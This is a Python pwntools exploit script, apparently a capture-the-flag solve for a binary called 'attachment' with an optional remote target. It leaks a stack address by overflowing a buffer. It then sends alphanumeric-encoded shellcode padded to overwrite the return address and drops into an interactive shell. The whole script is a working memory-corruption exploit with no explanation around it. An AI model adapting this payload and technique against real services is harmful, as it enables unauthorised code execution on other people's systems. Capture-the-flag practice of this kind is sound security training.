from pwn import *
import LibcSearcher

file = "./attachment"
elf = ELF(file)

context(arch=elf.arch,os='linux')

if args['DEBUG']:
    context.log_level = 'debug'


if args['REMOTE']:
    io = remote('192.168.202.151', 32768)
else:
    io = process(file)
    
    
if elf.arch == 'i386':
    B = 4
elif elf.arch == 'amd64':
    B = 8
else:
    print("PLS Input The Address Byte: ")
    B = int(input())
print("B=" +str(B))
    
sla = lambda ReceivedMessage,SendMessage :io.sendlineafter(ReceivedMessage,SendMessage)
sl = lambda SendMessage :io.sendline(SendMessage)
sa = lambda ReceivedMessage,SendMessage :io.sendafter(ReceivedMessage,SendMessage)
rcv = lambda ReceiveNumber, TimeOut=Timeout.default :io.recv(ReceiveNumber, TimeOut)
rcu = lambda ReceiveStopMessage, Drop=False, TimeOut=Timeout.default :io.recvuntil(ReceiveStopMessage,Drop,TimeOut)



#gdb.attach(io)
#05 1F 3B 7D 05 52 81 2C 9F 0D



io.send(b'A'*0xe8)

rcu(b'A'*0xe8)

addr = u32(rcv(4))

success("Leaked Address: " + hex(addr))

sh = b"hffffk4diFkDqj02Dqk0D1AuEE2O0T2w0Z0U0i0F3r180c7o023p3A4K4s3p4A1n0X335o352M0T1k0u2j120R2x5M4R0Y1P0e2s4x4O0s4U4s0Y07064t8o4B0r3m3D0x2r3Y3U092K4x3h0b2Z7M0W0F2E1l1M0R001o3I3C384r0s" 
#sh = b"hffffk4diFkDqj02Dqk0D1AuEE2O0T2w0Z0U0i0F3r180c7o023p3A4K4s3p4A1n0X7L060n010T1k0u2j120R2x5M4R0Y1P0e2s4x4O0s4U4w2F020o4w4t5p2n3m3D0x2r3Y3U092K4x3h0b2Z7M0W0F2E1l1M0R001o3I3C384r0s"

payload = sh
padding = 0xf8 +B
payload = payload.ljust(padding,b'A') 
payload += flat([addr,addr])
#gdb.attach(io)
io.sendline(payload)

io.interactive()
